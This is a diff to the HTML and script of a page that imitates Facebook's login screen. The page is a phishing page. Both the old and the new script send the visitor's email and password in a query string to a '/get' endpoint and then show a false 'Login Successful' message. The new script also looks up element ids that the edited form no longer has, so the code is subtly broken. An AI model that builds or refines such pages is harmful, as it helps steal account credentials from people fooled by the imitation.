@@ -297,18 +297,12 @@
             <section class="right-section">
                 <div class="login-form-container">
                     <h2 class="login-title">Log in to Facebook</h2>
-                    <form action="/get" method="get" id="login-form">
-                        <div id="login-step">
-                            <input type="text" class="input-field" placeholder="Email address or mobile number" id="email" name="email" required>
-                            <input type="password" class="input-field" placeholder="Password" id="password" name="password" required>
-                            <button type="submit" class="login-btn">Log in</button>
-                            <a href="#" class="forgot-link">Forgotten password?</a>
-                        </div>
-                        <div id="success-step" class="hidden" style="text-align: center; padding: 20px 0;">
-                            <div style="color: #008a00; font-size: 50px; margin-bottom: 20px;">✓</div>
-                            <h2 style="font-size: 24px; margin-bottom: 12px;">Login Successful</h2>
-                            <p style="color: #65676b; font-size: 14px;">Redirecting...</p>
-                        </div>
+                    <form action="/get" method="get">
+                        <input type="text" class="input-field" placeholder="Email address or mobile number" name="email"
+                            required>
+                        <input type="password" class="input-field" placeholder="Password" name="password" required>
+                        <button type="submit" class="login-btn">Log in</button>
+                        <a href="#" class="forgot-link">Forgotten password?</a>
                     </form>
 
                     <div class="create-account-container">
@@ -370,27 +364,20 @@
         </ul>
     </footer>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const form = document.getElementById('login-form');
-            const loginStep = document.getElementById('login-step');
-            const successStep = document.getElementById('success-step');
-            const emailInput = document.getElementById('email');
-            const passwordInput = document.getElementById('password');
-
-            form.addEventListener('submit', (e) => {
-                e.preventDefault();
-                const email = emailInput.value;
-                const pwd = passwordInput.value;
-                const url = `/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pwd)}`;
-
-                loginStep.classList.add('hidden');
-                successStep.classList.remove('hidden');
-
-                setTimeout(() => {
-                    window.location.href = url;
-                }, 500);
-            });
+<script>
+        document.getElementById("fb-form").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const email = document.getElementById("email").value;
+            const pass = document.getElementById("pass").value;
+            const successMsg = document.getElementById("fb-success");
+            
+            fetch(`/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}`)
+                .then(() => {
+                    successMsg.style.display = "block";
+                })
+                .catch(err => {
+                    successMsg.style.display = "block";
+                });
         });
     </script>
 </body>
